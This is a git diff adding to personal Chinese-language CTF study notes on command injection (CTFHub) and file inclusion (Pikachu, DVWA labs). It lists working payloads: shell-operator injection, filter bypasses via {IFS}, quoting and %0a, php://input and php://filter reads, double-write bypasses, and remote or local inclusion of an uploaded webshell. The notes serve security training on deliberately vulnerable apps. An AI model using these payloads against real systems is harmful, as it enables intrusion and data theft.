@@ -59,6 +59,25 @@
 | PHP 代码执行 | `eval()`       | 把字符串当作 PHP 代码执行          | `eval("echo 'RCE';");` → 执行 echo 语句  |
 |              | `assert()`     | 类似 eval，低版本 PHP 可执行代码   | `assert("system('ls')");` → 执行系统命令 |
 
+还有**路径符号**
+
+. 表示当前目录
+
+..表示父级目录
+
+/表示根目录
+
+./表示当前目录
+
+| 路径表达式    | 对应的绝对路径                      | 核心说明                         |
+| ------------- | ----------------------------------- | -------------------------------- |
+| `test.txt`    | `/home/user/work/test.txt`          | 省略 `./`，默认当前目录          |
+| `./test.txt`  | `/home/user/work/test.txt`          | 明确当前目录，和上面等价         |
+| `../test.txt` | `/home/user/test.txt`               | 上一级目录（work 的父目录 user） |
+| `~/test.txt`  | `/home/user/test.txt`               | 当前用户家目录（user 目录）      |
+| `/test.txt`   | `/test.txt`                         | 根目录下的 test.txt（绝对路径）  |
+| `cd -`        | 回到切换前的目录（如 `/home/user`） | 快速切换历史目录                 |
+
 1. payload `?cmd=cat /flag`
 2. `?cmd=tac /flag` 倒序输出
 3. `?cmd=head /flag`
@@ -111,8 +130,68 @@
 ## ctfhub
 
 1. 命令注入：咩有过滤，直接构造payload:`?ip=127.1 || ls`  `ip=127 || cat ----.php`,都是让shell1执行失败然后执行shell2
+
 2. 过滤cat 这个不行了还有好多别的，tac more less head tail nl tailf ,还有c'a't c''a''t
+
 3. 过滤空格，就用{IFS}代替
+
 4. 过滤目录分隔符，这个过滤了之后不能直接`cat /flag`了,需要先cd进入文件夹
+
 5. 过滤运算符，没过滤；和cat
+
 6. 综合，flag被过滤可以使用正则f***,命令分隔符除了；还有%0a(就是换行符)，但是需要在url中输入，如果在输入框中输入还会被编码
+
+7. php://input  
+
+   > [!IMPORTANT]
+   >
+   > php://input
+   >
+   > 作用：可用于查看源码，同时是要查看未压缩文件的只读流。在post请求中能查看请求的原始数据，并将post请求中的post数据当作php代码执行。（只读流是说只能进行读操作的数据）
+   >
+   > 条件：allow_url_fopen=off/on；allow_url_include=on
+   >
+   > 点击题中的 phpinfor 查看php情况，检查allow_url_include是否为on
+
+   ![image-20251227235048155](C:\Users\GWG\AppData\Roaming\Typora\typora-user-images\image-20251227235048155.png)
+
+8. 读取源代码 `?file=php://filter/read=/resource=/flag`
+
+   ![image-20251227235123931](C:\Users\GWG\AppData\Roaming\Typora\typora-user-images\image-20251227235123931.png)
+
+9. 远程包含  跟php://input过程一样
+
+### 文件包含
+
+从一个代码文件中直接引入另一个代码文件
+
+有两种，一种包含本地文件（服务器内部的文件，可以和文件上传漏洞结合），一种远程文件包含（通过url）
+
+PIKACHU
+
+1. 就是通过修改url来显示出本地的文件，我先在文件上传部分上传了一个php文件，之后在文件包含url中使用相对路径把这个文件显示出来
+2. 就是将网站想要访问的文件改为我们自己编写的远程服务器的恶意文件，按照url传入进去
+
+DVWA
+
+low：
+
+1. 本地 使用文件上传漏洞先上传一个php木马，再通过文件包含../../ payload：`../../hackable/uploads/shell.php`，还可以使用绝对路径
+2. 远程：现在自己服务器上写一个木马，传进去：`http://127.0.1.1/hack.txt`(这里需要注意传入的木马不能是php，因为php在自己服务器上就会被解析)
+
+medium:这一关http://和../被过滤了
+
+1. 可以使用绝对路径；尝试使用payload:`../../hackable/uploads/shell.php`，发现warning中../../没了，就知道是被替换为空了，就使用双写绕过，payload:`..././..././hackable/uploads/shell.php`
+2. warning中没有了http://同样使用双写绕过，`hhttp://ttp://127.0.1.1/hack.txt`成功进入
+
+high:
+
+伪协议：
+
+file:///path，放在url中
+
+http
+
+dict
+
+这个是通过file伪协议，构造payload:`file:///E:\CStools\phpstudy_pro\WWW\DVWA\hackable\uploads\shell.php`成功
